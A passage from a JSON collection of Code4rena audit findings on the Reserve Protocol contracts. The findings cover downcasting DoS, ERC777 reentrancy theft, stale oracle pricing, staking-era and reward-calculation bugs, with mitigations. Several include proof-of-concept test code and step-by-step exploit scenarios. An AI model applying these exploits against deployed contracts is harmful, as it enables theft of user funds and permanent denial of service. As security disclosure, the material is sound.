[AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/34).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the Reserve Protocol's StRSR.sol file. Specifically, the function \"_payoutRewards\" is used to accrue the value of rewards based on the time that has passed since \"payoutLastPaid\". This function should also be called when the functions \"setRewardPeriod\" and \"setRewardRatio\" are called, as these functions will change the rate of rewards. If this is not done, it could create an unfair reward stream or a governance attack. \n\nThe mitigation proposed is that the functions that change the slope or period size should accrue rewards up to that point. This is to avoid incorrect reward distribution, change of rewards from the past, or a gain or loss of yield to stakers. The suggested refactoring is to include the \"_payoutRewards\" function in the \"setRewardPeriod\" and \"setRewardRatio\" functions. \n\nOverall, this bug report is about a vulnerability in the code of the Reserve Protocol's StRSR.sol file which could create an unfair reward stream or a governance attack. The mitigation proposed is to accrue rewards up to the point when \"setRewardPeriod\" and \"setRewardRatio\" are called, and the suggested refactoring is to include the \"_payoutRewards\" function in these two functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/287",
      "tags": [],
      "finders": [
        "__141345__",
        "GalloDaSballo",
        "chaduke"
      ]
    },
    {
      "id": "16020",
      "title": "[M-10] Unsafe downcasting in issue(...) can be exploited to cause permanent DoS",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L230-L243\n\n\n## Vulnerability details\n\n## Unsafe downcasting in `issue(...)` can be exploited to cause permanent DoS\n\n#### Important note!\nI first found this bug in `issue(...)` at first, but unsafe downcasting appears in many other areas of the codebase, and seem to also be exploitable but no PoC is provided due to time constraints. Either way, using some form of safe casting library to **replace all occurences** of unsafe downcasting will prevent all the issues. I also do not list the individual instances of unsafe downcasting as all occurences should be replaced with safe cast.\n\n### Details\nThe `amtRToken` is a user supplied parameter in the `issue(uint256 amtRToken)` function\n```sol\nuint192 amtBaskets = uint192(\n\ttotalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken\n);\n```\nThe calculated amount is unsafely downcasted into `uint192`.\n\nThis means that if the resulting calculation is a multiple of $2^{192}$, `amtBaskets = 0`\n\nThe code proceeds to the following line, where `erc20s` and `deposits` arrays will be empty since we are asking for a quote for 0. (see `quote(...)` in `BasketHandler.sol` where amounts are multiplied by zero)\n```sol\n(address[] memory erc20s, uint256[] memory deposits) = basketHandler.quote(\n            amtBaskets,\n            CEIL\n        );\n```\nThis means an attacker can call `issue(...)` with a very high `amtRToken` amount that is a multiple of $2^{192}$, without depositing any amount of collateral.\n\nThe DoS issues arises because `whenFinished(uint256 amtRToken)` is dependent on `amtRToken`. With such a high value, `allVestAt` will be set so far in the future that it causes a permanent DoS. i.e. Issuances will never vest.\n```sol\nuint192 vestingEnd = whenFinished(amtRToken); // D18{block number}\n```\n\n### Proof of Concept\nThis PoC demonstrates that an attacker can call `issue(...)` without collateral tokens to modify `allVestAt` variable to an extreme value, such that all further issuances cannot be vested for all users.\n\nDo note that the PoC is done with `totalSupply() == 0` case, so we supply `amtRToken` as a multiple of $2^{192}$. Even if there is an existing `totalSupply()`, we just need to calculate a value for `amtRToken >= 2^192` such that $\\frac{\\text{basketsNeeded} \\times \\text{amtRToken}}{totalSupply()} = 0$. This attack does not require `totalSupply()` be zero.\n\n```sol\nuint192 amtBaskets = uint192(\n\ttotalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken\n);\n```\n\nThe `amount`, `baskets` and `quantities` values are also messed up, but it would not matter anyways...\n\nUnder 'Issuance and Slow Minting' tests in `RToken.test.ts`:\n```sol\nit('Audit: DoS by downcasting', async function () {\n      const issueAmount: BigNumber = BigNumber.from(2n ** 192n)\n\n      // Set basket\n      await basketHandler.connect(owner).setPrimeBasket([token0.address], [fp('1')])\n      await basketHandler.connect(owner).refreshBasket()\n\n      // Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens\n      // This will cause allVestAt to be veryyyyy high, permanent DoS\n      const tx = await rToken.connect(addr1)['issue(uint256)'](issueAmount)\n      const receipt = await tx.wait()\n      console.log(receipt.events[0].args)\n  \n      await token0.connect(addr2).approve(rToken.address, initialBal)\n      const tx2 = await rToken.connect(addr2)['issue(uint256)'](initialBal)\n      const receipt2 = await tx2.wait()\n      console.log(receipt2.events[0].args)\n\n      // one eternity later...\n      await advanceTime('123456789123456789')\n      // and still not ready\n      await expect(rToken.connect(addr2).vest(addr2.address, 1))\n        .to.be.revertedWith(\"issuance not ready\")\n\n    })\n```\nRun with:\n```bash\nyarn test:p1 --grep \"Audit: DoS\"\n```\nExpect to see (only important parts shown):\n```bash\n[\n  ...\n  recipient: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  index: BigNumber { value: \"0\" },\n  amount: BigNumber { value: \"6277101735386680763835789423207666416102355444464034512896\" },\n  baskets: BigNumber { value: \"0\" },\n  erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],\n  quantities: [ BigNumber { value: \"0\" } ],\n  blockAvailableAt: BigNumber { value: \"627710173538668076383578942320766744610235544446403452\" }\n]\n[\n  ...\n  recipient: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',\n  index: BigNumber { value: \"0\" },\n  amount: BigNumber { value: \"6300000000000000000000000000000000000000000000000000000000\" },\n  baskets: BigNumber { value: \"22898264613319236164210576792333583897644555535965487104\" },\n  erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],\n  quantities: [\n    BigNumber { value: \"22898264613319236164210576792333583897644555535965487104\" }\n  ],\n  blockAvailableAt: BigNumber { value: \"1257710173538668076383578942320766744610235544446403452\" }\n]\n\n  RTokenP1 contract\n    Issuance and Slow Minting\n      ✔ Audit: DoS by downcasting\n```\n\n### Impact\nPermanent DoS would be High risk considering RToken is an asset-backed **currency**.\n_A currency that is unable to issue new currency does not work as a currency_\n\nAlso, I believe existing collateral cannot be redeemed due to the extreme values also used in `redeem(...)` function. No PoC written due to time constriant for this case... but above should be enough impact.\n\nMany other downcasting issues for this project. But using a safe casting library would prevent all the issues... not going to write multiple reports for same underlying issue.\n\n### Recommendations\nUse some safe casting library. OpenZeppelin's library does not have safe casting for `uint192` type. May have to find another or write your own.",
      "summary": "\nThis bug report is about an unsafe downcasting issue in the Reserve Protocol's `RToken.sol` contract. Unsafe downcasting in the `issue(...)` function can be exploited to cause permanent DoS. This means that if the resulting calculation is a multiple of $2^{192}$, `amtBaskets = 0`, and `erc20s` and `deposits` arrays will be empty. This will allow an attacker to call `issue(...)` with a very high `amtRToken` amount that is a multiple of $2^{192}$, without depositing any amount of collateral. This will cause `allVestAt` to be set so far in the future that it causes a permanent DoS, meaning issuances will never vest.\n\nThe impact of this bug is high risk, as RToken is an asset-backed currency and a currency that is unable to issue new currency does not work as a currency. It is also possible that existing collateral cannot be redeemed due to the extreme values also used in `redeem(...)` function.\n\nTo prevent this issue, the report recommends using some safe casting library. OpenZeppelin's library does not have safe casting for `uint192` type, so another library will have to be found or written. All occurences of unsafe downcasting should be replaced with safe cast.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/320",
      "tags": [
        "Type casting"
      ],
      "finders": [
        "Soosh"
      ]
    },
    {
      "id": "16019",
      "title": "[M-09] Withdrawals will stuck",
      "impact": "MEDIUM",
      "content": "\nIf a new era gets started for stakeRSR and draftRSR still point to old era then user will be at risk of losing their future holdings.\n\n### Proof of Concept\n\n1.  seizeRSR is called with amount 150 where stakeRSR was 50 and draftRSR was 80. The era was 1 currently for both stake and draft\n\n```\n\n    function seizeRSR(uint256 rsrAmount) external notPausedOrFrozen {\n    ...\n    stakeRSR -= stakeRSRToTake;\n    ..\n    if (stakeRSR == 0 || stakeRate > MAX_STAKE_RATE) {\n                seizedRSR += stakeRSR;\n                beginEra();\n            }\n    ...\n    draftRSR -= draftRSRToTake;\n    if (draftRSR > 0) {\n                // Downcast is safe: totalDrafts is 1e38 at most so expression maximum value is 1e56\n                draftRate = uint192((FIX_ONE_256 * totalDrafts + (draftRSR - 1)) / draftRSR);\n            }\n\n    ...\n```\n\n2.  stakeRSR portion comes to be 50 which means remaining stakeRSR will be 0 (50-50). This means a new staking era will get started\n\n```\n\n    if (stakeRSR == 0 || stakeRate > MAX_STAKE_RATE) {\n                seizedRSR += stakeRSR;\n                beginEra();\n            }\n```\n\n3.  This causes staking era to become 2\n\n```\n\n    function beginEra() internal virtual {\n            stakeRSR = 0;\n            totalStakes = 0;\n            stakeRate = FIX_ONE;\n            era++;\n\n            emit AllBalancesReset(era);\n        }\n```\n\n4.  Now draftRSR is still > 0 so only draftRate gets updated. The draft Era still remains 1\n\n5.  User stakes and unstakes in this new era. Staking is done in era 2\n\n6.  Unstaking calls the pushDraft which creates User draft on draftEra which is still 1\n\n```\n\n    function pushDraft(address account, uint256 rsrAmount)\n            internal\n            returns (uint256 index, uint64 availableAt)\n        {\n    ...\n    CumulativeDraft[] storage queue = draftQueues[draftEra][account];\n           ...\n\n            queue.push(CumulativeDraft(uint176(oldDrafts + draftAmount), availableAt));\n    ...\n    }\n```\n\n7.  Lets say due to unfortunate condition again seizeRSR need to be called. This time `draftRate > MAX_DRAFT_RATE` which means draft era increases and becomes 2\n\n```\n\n    if (draftRSR == 0 || draftRate > MAX_DRAFT_RATE) {\n                seizedRSR += draftRSR;\n                beginDraftEra();\n            }\n```\n\n8.  This becomes a problem since all unstaking done till now in era 2 were pointing in draft era 1. Once draft era gets updated to 2, all those unstaking are lost.\n\n### Recommended Mitigation Steps\n\nEra should be same for staking and draft. So if User is unstaking at era 1 then withdrawal draft should always be era 1 and not some previous era.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/325#issuecomment-1402728967):**\n > I believe the sequence of events here to be off with when beginDraftEra would be called.\n> \n> Will leave open for sponsor confirmation on the beginDraftEra call being triggered earlier in the process due to the value of `draftRSR == 0`. \n\n**[tbrent (Reserve) disputed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/325#issuecomment-1405551460):**\n > In the example described, I'm pretty sure point 4 is wrong: draftRSR would be 0 and both the eras would be changed at the same time.\n> \n> That said, I don't think it's a problem to have different eras for stakeRSR and draftRSR. It's subtle, but it could be that due to rounding one of these overflows `MAX_STAKE_RATE`/`MAX_DRAFT_RATE`, but not the other. This is fine. This means enough devaluation has happened to one of the polities (current stakers; current withdrawers) that they have been wiped out. It's not a contradiction for the other polity to still be entitled to a small amount of RSR.\n> \n> It also might be the warden is misunderstanding the intended design here: if you initiate StRSR unstaking, then a sufficient RSR seizure event _should_ result in the inability to withdraw anything after. \n\n***Please note: the following comment and re-assessment took place after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.***\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/325#issuecomment-1428774156):**\n > I wanted to comment and apologize that this issue slipped through the QA process and I didn't give it a second pass to close it out as invalid. While C4 will not change grades or awards retroactively, it is worth noting for the final report that I do not believe this issue to be valid. \n\n\n\n***\n\n",
      "summary": "\nThe bug report is about the Reserve Protocol's StRSR.sol contract. If a new staking era is started, but the draftRSR still points to the old era, the user is at risk of losing their future holdings. This is because when unstaking is done, the draft is created in the old era. When the draft era is updated, all the unstaking done in the new era is lost. \n\nThe bug can be demonstrated by an example. Suppose the current era is 1 for both stake and draft, and seizeRSR is called with an amount of 150 (where stakeRSR was 50 and draftRSR was 80). The stakeRSR portion comes to be 50, which means the remaining stakeRSR will be 0 (50-50). This means a new staking era will be started. This causes the staking era to become 2. Now, the draftRSR is still > 0, so only the draftRate gets updated. The draft era still remains 1. If a user stakes and unstakes in this new era, the unstaking will call the pushDraft function which creates a user draft on the draftEra which is still 1. If, due to some unfortunate condition, seizeRSR needs to be called again, the draftRate > MAX_DRAFT_RATE which means the draft era increases and becomes 2. This becomes a problem since all unstaking done till now in era 2 were pointing in draft era 1. Once the draft era is updated to 2, all those unstakings are lost.\n\nThe recommended mitigation step is that the era should be the same for staking and draft. This way, if a user is unstaking at era 1, the withdrawal draft should always be era 1 and not some previous era.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/325",
      "tags": [],
      "finders": [
        "csanuragjain"
      ]
    },
    {
      "id": "16018",
      "title": "[M-08] Asset.lotPrice() doesn’t use the most recent price in case of oracle timeout",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/Asset.sol#L144-L145\n\n\n## Vulnerability details\n\n## Impact\n\n`Asset.lotPrice()` has a fallback mechanism in case that `tryPrice()` fails - it uses the last saved price and multiplies its value by `lotMultiplier` (a variable that decreases as the time since the last saved price increase) and returns the results.\nHowever, the `tryPrice()` might fail due to oracle timeout, in that case the last saved price might be older than the oracle's price.\n\nThis can cause the backing manager to misestimate the value of the asset, trade it at a lower price, or do an unnecessary haircut.\n\n## Proof of Concept\nIn the PoC below:\n* Oracle price is set at day 0\n* The asset is refreshed (e.g. somebody issued/vested/redeemed)\n* After 5 days the oracle gets an update\n* 25 hours later the `lotPrice()` is calculated based on the oracle price from day 0 even though a price from day 5 is available from the oracle\n* Oracle gets another update\n* 25 hours later the `lotPrice()` goes down to zero since it considers the price from day 0 (which is more than a week ago) to be the last saved price, even though a price from a day ago is available from the oracle\n\n```diff\ndiff --git a/test/fixtures.ts b/test/fixtures.ts\nindex 5299a5f6..75ca8010 100644\n--- a/test/fixtures.ts\n+++ b/test/fixtures.ts\n@@ -69,7 +69,7 @@ export const SLOW = !!useEnv('SLOW')\n \n export const PRICE_TIMEOUT = bn('604800') // 1 week\n \n-export const ORACLE_TIMEOUT = bn('281474976710655').div(2) // type(uint48).max / 2\n+export const ORACLE_TIMEOUT = bn('86400') // one day\n \n export const ORACLE_ERROR = fp('0.01') // 1% oracle error\n \ndiff --git a/test/plugins/Asset.test.ts b/test/plugins/Asset.test.ts\nindex d49c53f3..7f2f721e 100644\n--- a/test/plugins/Asset.test.ts\n+++ b/test/plugins/Asset.test.ts\n@@ -233,6 +233,45 @@ describe('Assets contracts #fast', () => {\n       )\n     })\n \n+    it('PoC lot price doesn\\'t use most recent price', async () => {\n+      // Update values in Oracles to 0\n+\n+      await setOraclePrice(rsrAsset.address, bn('1.1e8'))\n+\n+      await rsrAsset.refresh();\n+      let [lotLow, lotHigh] = await rsrAsset.lotPrice();\n+      let descripion = \"day 0\";\n+      console.log({descripion, lotLow, lotHigh});\n+      let hour = 60*60;\n+      let day = hour*24;\n+      await advanceTime(day * 5);\n+\n+      await setOraclePrice(rsrAsset.address, bn('2e8'));\n+      // await rsrAsset.refresh();\n+\n+      [lotLow, lotHigh] = await rsrAsset.lotPrice();\n+      descripion = 'after 5 days (right after update)';\n+      console.log({descripion,lotLow, lotHigh});\n+\n+      await advanceTime(day + hour);\n+\n+      // Fallback prices should be zero\n+\n+      [lotLow, lotHigh] = await rsrAsset.lotPrice();\n+      descripion = 'after 6+ days';\n+      console.log({descripion, lotLow, lotHigh});\n+\n+      await setOraclePrice(rsrAsset.address, bn('2e8'));\n+\n+      await advanceTime(day + hour);\n+\n+      [lotLow, lotHigh] = await rsrAsset.lotPrice();\n+      descripion = 'after 7+ days';\n+      console.log({descripion, lotLow, lotHigh});\n+\n+    })\n+    return;\n+\n     it('Should return (0, 0) if price is zero', async () => {\n       // Update values in Oracles to 0\n       await setOraclePrice(compAsset.address, bn('0'))\n@@ -595,6 +634,7 @@ describe('Assets contracts #fast', () => {\n       expect(lotHighPrice4).to.be.equal(bn(0))\n     })\n   })\n+  return;\n \n   describe('Constructor validation', () => {\n     it('Should not allow price timeout to be zero', async () => {\n\n```\n\nOutput:\n```\n{\n  descripion: 'day 0',\n  lotLow: BigNumber { value: \"1089000000000000000\" },\n  lotHigh: BigNumber { value: \"1111000000000000000\" }\n}\n{\n  descripion: 'after 5 days (right after update)',\n  lotLow: BigNumber { value: \"1980000000000000000\" },\n  lotHigh: BigNumber { value: \"2020000000000000000\" }\n}\n{\n  descripion: 'after 6+ days',\n  lotLow: BigNumber { value: \"149087485119047618\" },\n  lotHigh: BigNumber { value: \"152099353505291005\" }\n}\n{\n  descripion: 'after 7+ days', // `lotPrice()` returns zero even though the most recent price the oracle holds is from 25 hours ago\n  lotLow: BigNumber { value: \"0\" },\n  lotHigh: BigNumber { value: \"0\" }\n}\n```\n\n## Recommended Mitigation Steps\nAllow specifying a timeout to `tryPrice()`, in case that `tryPrice()` fails due to oracle timeout then call it again with `priceTimeout` as the timeout.\nIf the call succeeds the second time then use it as the most recent price for fallback calculations.",
      "summary": "\nThis bug report is regarding the `Asset.lotPrice()` function in the Reserve Protocol's contracts. This function has a fallback mechanism that uses the last saved price and multiplies its value by `lotMultiplier` (a variable that decreases as the time since the last saved price increase) and returns the results. However, the `tryPrice()` might fail due to oracle timeout, in that case the last saved price might be older than the oracle's price. This can cause the backing manager to misestimate the value of the asset, trade it at a lower price, or do an unnecessary haircut.\n\nThe bug report includes a proof of concept to demonstrate the issue. It states that if the oracle gets an update after 5 days, and `lotPrice()` is calculated 25 hours later, it will still consider the price from day 0 (which is more than a week ago) to be the last saved price, even though a price from a day ago is available from the oracle.\n\nThe recommended mitigation steps are to allow specifying a timeout to `tryPrice()`, in case that `tryPrice()` fails due to oracle timeout then call it again with `priceTimeout` as the timeout. If the call succeeds the second time then use it as the most recent price for fallback calculations.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/326",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "16017",
      "title": "[M-07] Attacker can steal RToken holders’ funds by performing reentrancy attack during redeem() function token transfers",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L105-L150\n\n\n## Vulnerability details\n\n## Impact\nFunction `redeem()` redeems RToken for basket collateral and it updated `basketsNeeded` and transfers users basket ERC20 from BackingManager to user address. it loops through tokens and transfer them to caller and if one of tokens were ERC777 or any other 3rd party protocol token with hook, attacker can perform reentrancy attack during token transfers. Attacker can cause multiple impacts by choosing the reentrancy function:\n1. attacker can call `redeem()` again and bypass \"bounding each withdrawal by the prorata share when protocol is under-collateralized\" because tokens balance of BackingManager is not updated yet.\n2. attacker can call `BackingManager.manageTokens()` and because `basketsNeeded` gets decreased and basket tokens balances of BasketManager are not updated, code would detect those tokens as excess funds and would distribute them between RSR stakers and RToken holders and some of RToken deposits would get transferred to RSR holders as rewards.\n\n## Proof of Concept\nThis is `redeem()` code:\n```\n    function redeem(uint256 amount) external notFrozen {\n...............\n...............\n        (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);\n\n        uint256 erc20length = erc20s.length;\n\n        uint192 prorate = uint192((FIX_ONE_256 * amount) / supply);\n\n        // Bound each withdrawal by the prorata share, in case we're currently under-collateralized\n        for (uint256 i = 0; i < erc20length; ++i) {\n            uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));\n\n            uint256 prorata = (prorate > 0)\n                ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18\n                : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}\n\n            if (prorata < amounts[i]) amounts[i] = prorata;\n        }\n\n        basketsNeeded = basketsNeeded_ - baskets;\n        emit BasketsNeededChanged(basketsNeeded_, basketsNeeded);\n\n        // == Interactions ==\n        _burn(redeemer, amount);\n\n        bool allZero = true;\n        for (uint256 i = 0; i < erc20length; ++i) {\n            if (amounts[i] == 0) continue;\n            if (allZero) allZero = false;\n\n            IERC20Upgradeable(erc20s[i]).safeTransferFrom(\n                address(backingManager),\n                redeemer,\n                amounts[i]\n            );\n        }\n\n        if (allZero) revert(\"Empty redemption\");\n    }\n```\nAs you can see code calculates withdrawal amount of each basket erc20 tokens by calling `basketHandler.quote()` and then bounds each withdrawal by the prorata share of token balance, in case protocol is under-collateralized. and then code updates `basketsNeeded` and in the end transfers the tokens.  if one of those tokens were ERC777 then that token would call receiver hook function in token transfer. there may be other 3rd party protocol tokens that calls registered hook functions during the token transfer. as reserve protocol is permission less and tries to work with all tokens so the external call in the token transfer can call hook functions. attacker can use this hook and perform reentrancy attack.\nThis is `fullyCollateralized()` code in BasketHandler:\n```\n    function fullyCollateralized() external view returns (bool) {\n        return basketsHeldBy(address(backingManager)) >= rToken.basketsNeeded();\n    }\n```\nAs you can see it calculates baskets that can be held by backingManager tokens balance and needed baskets by RToken contract and by comparing them determines that if RToken is fully collateralized or not. if RToken is fully collateralized then `BackingManager.manageTokens()` would call `handoutExcessAssets()` and would distributes extra funds between RToken holders and RSR stakers.\nthe root cause of the issue is that during tokens transfers in `redeem()` not all the basket tokens balance of the BackingManager updates once and if one has hook function which calls attacker contract then attacker can use this updated token balance of the contract and perform his reentrancy attack. attacker can call different functions for reentrancy. these are two scenarios:\n** scenario #1: attacker call `redeem()` again and bypass prorata share bound check when protocol is under-collaterialized:\n1. tokens [`SOME_ERC777`, `USDT`] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1.\n2. BackingManager has 200K `SOME_ERC777` balance and 100K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block.\n3. attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers.\n4. attacker would call `redeem()` to redeem 15K RToken and code would updated `basketsNeeded` to 135K and code would bounds withdrawal by prorata shares of balance of the BackingManager because protocol is under-collateralized and code would calculated withdrawal amouns as 15K `SOME_ERC777` tokens and 10K `USDT` tokens (instead of 15K `USDT` tokens) for withdraws.\n5. then contract would transfer 15K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 135K and total RTokens is 135K and BackingManager balance is 185K `SOME_ERC777` and 100K `USDT` (`USDT` is not yet transferred). then attacker contract can call `redeem()` again for the remaining 15K RTokens.\n6. because protocol is under-collateralized code would calculated withdrawal amouns as 15K `SOME_ERC777` and 11.1K `USDT` (USDT_balance * rtokenAmount / totalSupply = 100K * 15K / 135K) and it would burn 15K RToken form caller and the new value of totalSupply of RTokens would be 120K and `basketsNeeded` would be 120K too. then code would transfers 15K `SOME_ERC777` and 11.1K `USDT` for attacker address. \n7. attacker's hook function would return and `redeem()` would transfer 10K `USDT` to attacker in the rest of the execution. attacker would receive 30K `SOME_ERC777` and 21.1K `USDT` tokens for 15K redeemed RToken but attacker should have get (`100 * 30K / 150K = 20K`) 20K `USDT` tokens because of the bound each withdrawal by the prorata share, in case we're currently under-collateralized.\n8. so attacker would be able to bypass the bounding check and withdraw more funds and stole other users funds. the attack is more effective if withdrawal battery charge is higher but in general case attacker can perform two withdraw each with about `charge/2` amount of RToken in each block and stole other users funds when protocol is under collaterlized.\n\n** scenario #2: attacker can call `BackingManager.manageTokens()` for reentrancy call:\n1. tokens [`SOME_ERC777`, `USDT`] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1.\n2. BackingManager has 200K `SOME_ERC777` balance and 150K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block.\n3. attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers.\n4. attacker would call `redeem()` to redeem 30K RToken and code would updated `basketsNeeded` to 120K and burn 30K RToken and code would calculated withdrawal amounts as 30K `SOME_ERC777` tokens and 30K `USDT` tokens for withdraws.\n5. then contract would transfer 30K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 120K and total RTokens is 120K and BackingManager balance is 170K `SOME_ERC777` and 150K `USDT` (`USDT` is not yet transferred). then attacker contract can call `BackingManager.manageTokens()`.\n6. function `manageTokens()` would calculated baskets can held by BackingManager and it would be higher than 150K and `basketsNeeded` would be 130K and code would consider 60K `SOME_ERC777` and 30K `USDT` tokens as revenue and try to distribute it between RSR stakers and RToken holders. code would mint 30K RTokens and would distribute it.\n7. then attacker hook function would return and `redeem()` would transfer 30K `USDT` to attacker address in rest of the execution.\n8. so attacker would able to make code to calculate RToken holders backed tokens as revenue and distribute it between RSR stakers and RSR stakers would receive RTokens backed tokens as rewards. the attack is more effective is battery charge is high but in general case attacker can call redeem for battery charge amount and cause those funds to be counted and get distributed to the RSR stakers (according to the rewards distribution rate)\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nprevent reading reentrancy attack by central reentrancy guard or by one main proxy interface contract that has reentrancy guard.\nor create contract state (similar to basket nonce) which changes after each interaction and check for contracts states change during the call. (start and end of the call)",
      "summary": "\nThis bug report is about a reentrancy attack vulnerability in the Reserve Protocol. This attack can be used to bypass the prorata share bound check when the protocol is under-collateralized, as well as to make the code calculate RToken holders backed tokens as revenue and distribute it between RSR stakers. \n\nThe vulnerability occurs when the attacker registers a hook function in an ERC777 or 3rd party protocol token, and then calls the `redeem()` function in the RToken contract. The `redeem()` function updates the `basketsNeeded` variable, and then transfers the tokens. If one of these tokens has a hook function, the attacker can use this to perform a reentrancy attack. \n\nIn the first scenario, the attacker can call `redeem()` again and bypass the prorata share bound check when the protocol is under-collateralized. In the second scenario, the attacker can call `BackingManager.manageTokens()` and make the code calculate RToken holders backed tokens as revenue and distribute it between RSR stakers. \n\nThe recommended mitigation steps are to prevent reading reentrancy attacks by using a central reentrancy guard or by creating a main proxy interface contract that has a reentrancy guard. Alternatively, a contract state (similar to basket nonce) can be created which changes after each interaction, and then checked for changes during the call.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/347",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "unforgiven",
        "ustas",
        "hihen"
      ]
    },
    {
      "id": "16016",
      "title": "[M-06] Too few rewards paid over periods in Furnace and StRSR",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L77-L79><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L509-L512><br>\n<https://github.com/reserve-protocol/protocol/blob/946d9b101dd77275c6cbfe0bfe9457927bd221a9/contracts/p1/StRSR.sol#L490-L493>\n\nFor two instances in the codebase ([`Furnace`](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L77-L79) and [`StRSR`](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L509-L512)), the composed rewards calculation seems to be wrong.\n\nHow the rewards are working in these two snippets is that we are first measuring how much `period` or `rewardPeriod` occured since the last payout and calculating in only **one** step the rewards that should be distributed over these periods. In other words, it is composing the ratio over periods.\n\n### Proof of Concept\n\nTaken from the [comments](https://github.com/reserve-protocol/protocol/blob/946d9b101dd77275c6cbfe0bfe9457927bd221a9/contracts/p1/StRSR.sol#L490-L493), we can write the formula of the next rewards payout as:\n\n    with n = (i+1) > 0, n is the number of periods\n    rewards{0} = rsrRewards()\n    payout{i+1} = rewards{i} * payoutRatio\n    rewards{i+1} = rewards{i} - payout{i+1}\n    rewards{i+1} = rewards{i} * (1 - payoutRatio)\n\nGeneralization:\n$$u\\_{i+1} = u\\_{i} * (1 - r)$$\n\nIt's a geometric mean whose growth rate is `(1 - r)`.\n\nCalculation of the sum:\n\n![](https://user-images.githubusercontent.com/51274081/213756676-cbbcf22b-3237-433d-a6e3-9577b6d75474.png)\n\nYou can play with the graph [here](https://www.desmos.com/calculator/1fnpsnf8nt).\n\nFor a practical example, let's say that our `rsrRewardsAtLastPayout` is 5, with a `rewardRatio` of 0.9.\n\nIf we had to calculate our compounded rewards, from the formula given by the comments above, we could calculate manually for the first elements. Let's take the sum for n = 3:\n\n$$S = u\\_{2} + u\\_{1} + u\\_{0}$$\n$$u\\_{2} = u\\_{1} * (1-0.9)$$\n$$u\\_{1} = u\\_{0} * (1-0.9)$$\n$$u\\_{0} = rsrRewardsAtLastPayout$$\n\nSo,\n\n$$S = u\\_{0} * (1-0.9) * (1-0.9) + u\\_{0} * (1-0.9) + u\\_{0}$$\n\nFor the values given above, that's\n\n$$S = 5 * 0.1² + 5 * 0.1 + 5$$\n$$S = 5.55$$\n\nIf we do the same calculation with the sum 